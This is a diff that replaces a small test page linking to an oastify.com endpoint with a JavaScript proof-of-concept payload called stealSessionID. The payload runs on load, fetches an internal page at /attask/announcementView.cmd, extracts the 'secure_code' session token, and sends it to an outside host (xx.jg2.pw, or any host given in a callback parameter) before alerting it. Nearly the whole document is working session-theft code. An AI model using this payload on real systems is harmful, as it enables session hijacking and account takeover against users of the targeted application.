@@ -1,14 +1,51 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Test Link</title>
-</head>
-<body>
-    <p>
-        <a href="https://9nxgm3g274fr08xa114ajdl6txzonfb4.oastify.com/">
-            Click here to visit the test endpoint
-        </a>
-    </p>
-</body>
-</html>
+function getQueryParam(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+
+async function stealSessionID() {
+    // Step 1: Get session ID from internal API
+    const response = await fetch('/attask/announcementView.cmd ');
+
+    const data = await response.text();
+    
+    // Extract the 'secure_code' from the html
+    var searchString = 'secure_code" value="';
+    var start = data.indexOf(searchString);
+
+    start += searchString.length;                 
+    var end = data.indexOf('"', start);
+
+    var sessionID = data.substring(start, end);      // extract
+    
+    
+
+    // Step 2: Default exfiltration URL
+    let targetUrl = "https://xx.jg2.pw";
+
+    // Step 3: Check for ?callback= parameter in the current URL
+    const callbackParam = getQueryParam("callback");
+    if (callbackParam) {
+        targetUrl = callbackParam;
+    }
+    try{
+        // Step 4: Send session ID to the chosen endpoint
+        const secondResponse = await fetch(`${targetUrl}?session=${sessionID}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+        });
+
+    } catch{
+        
+    }
+
+
+
+    window.alert(sessionID);
+
+}
+
+stealSessionID();
